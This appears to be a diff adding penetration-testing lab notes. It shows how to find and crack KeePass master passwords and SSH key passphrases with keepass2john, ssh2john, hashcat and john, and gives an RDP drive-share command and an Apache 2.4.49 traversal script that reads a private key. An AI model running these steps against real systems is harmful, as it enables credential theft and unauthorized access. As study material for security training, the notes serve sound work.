@@ -247,3 +247,168 @@ https://www.kali.org/tools/hash-identifier/
 https://www.kali.org/tools/hashid/
 
 Be certain to put your hashes in SINGLE quotes if they contain special characters, like $ hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
+
+### Password Manager
+
+A master password grants acccess to all other passwords stored by a password manager. We can extract a password manager's db, reformat the file for Hashcat, and crack the master database password.
+
+After getting creds to a typical user account, login over RDP and check the programs that are installed on their system. With a GUI, you can do this with "Apps & features". Windows Icon > type "Apps" > Add or remove programs. Scroll down to see the installed programs.
+
+Assume we found KeePass on a system. Researching tells us the KeePass db is stored as a .kdbx file and there may be more than one! This could be if they have both a personal db and an organizational/departmental db. 
+
+Search for all .kdbx files on the system:
+
+```console
+``` powershell.exe Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+  Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+```
+
+Transfer the file to your Kali system. Use John the Ripper (JtR) transformation scripts (like ssh2john or keepass2john) to format our files for John or Hashcat.
+
+```console
+$ keepass2john Database.kdbx > keepass.hash
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd...
+
+// still need to modify this further - remove "Dataabase" from file since KeePass uses a master password with no username
+
+$ nano keepass.hash
+$ cat keepass.hash
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd...
+
+// lastly, determine the hashtype: use the Hashcat WIki or grep the help output
+
+$ hashcat --help | grep -i "KeePass"
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
+  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
+```
+
+The correct mode here is 13400. Let's use Hashcat's rockyou-30000.rule rule combined with rockyou.txt.
+
+```console
+$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+```
+
+We now have the master password to login to KeePass with and view all the other stored passwords.
+
+TIP: Another way to get a shared drive on a Windows machine:
+
+```console
+$ xfreerdp /cert-ignore /bpp:8 /smart-sizing /compression -themes -wallpaper /auto-reconnect /drive:shared,/tmp /u:nadine /p:123abc /h:800 /w:1400 /v:192.168.192.227
+```
+
+### SSH Private Key Passphrase
+
+Say we have a web service on our target's port 8080 and find the following files:
+
+```console
+$ cat note.txt
+password list:
+
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+Note to myself:
+New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
+
+$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBwWeeKjT...
+```
+
+To use the private id_rsa key for dave, you need to first change the perms.
+
+```console
+$ chmod 600 id_rsa
+
+$ ssh -i id_rsa -p 2222 dave@192.168.50.201
+// try all of the passwords we found in the note
+```
+
+None of them work? Maybe dave's new password policy is in place. Let's try to crack.
+
+```console
+$ ssh2john id_rsa > ssh.hash
+
+$ cat ssh.hash
+id_rsa:$sshng$6$16$....      // the $6$ means this is SHA-512
+
+// need to remove the filename from the front before the first colon
+
+$ nano ssh.hash
+$ cat ssh.hash
+$sshng$6$16...
+
+$ hashcat -h | grep -i "ssh"
+...
+  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+...
+
+// create rule based on note.txt
+
+$ nano ssh.rule
+$ cat ssh.rule
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+// create wordlist of passwords from note.txt
+
+$ nano ssh.passwords
+$ cat ssh.passwords
+Window
+rickc137
+dave
+superdave
+megadave
+umbrella
+
+// crack!
+
+$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+Token length exception
+```
+
+Modern private keys and their respective passphrases are created with aes-256-ctr3. Hashcat's mode 22921 does not support this. Let's try john.
+
+```console
+// fix the rule syntax
+
+$ nano cat ssh.rule
+$ cat ssh.rule
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+
+// append rule to john.conf
+
+$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
+
+// crack!
+
+$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+```
+
+Found the password? Try to ssh:
+
+```console
+$ ssh -i id_rsa -p 2222 dave@192.168.50.201
+```
+
+Additional Example:
+
+Found an Apache 2.4.49 server? Use the known directory traversal vuln.
+
+```console
+$ bash ./50383.sh targets.txt /home/alfred/.ssh/id_rsa 
+```
